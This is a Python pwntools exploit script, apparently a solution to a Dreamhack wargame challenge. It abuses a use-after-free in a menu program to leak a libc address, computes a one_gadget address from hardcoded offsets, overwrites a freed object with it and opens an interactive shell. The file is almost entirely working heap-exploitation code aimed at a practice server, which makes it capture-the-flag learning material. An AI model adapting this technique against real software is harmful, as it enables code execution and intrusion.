#!/usr/bin/python3
# Name: uaf_overwrite.py
from pwn import *

p = remote("host1.dreamhack.games", 21755)

def slog(sym, val): success(sym + ": " + hex(val))

context.log_level = 'debug'

def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))
def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))
def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))

# UAF to calculate the `libc_base`
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)

#libc_base is XXXXXX00!! OMG
# custom(0x500, "B", -1)
# lb = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42

main_arena = u64(p.recvline()[0:-1]+b"\x00"*2)
main_arena_offset = 0x3ebc42
lb_jun = main_arena - main_arena_offset
og = lb_jun + 0x10a41c

slog("main_arena", main_arena)
slog("libc_jun", lb_jun)
slog("one_gadget", og)

human(1, og)
robot(1)

p.interactive()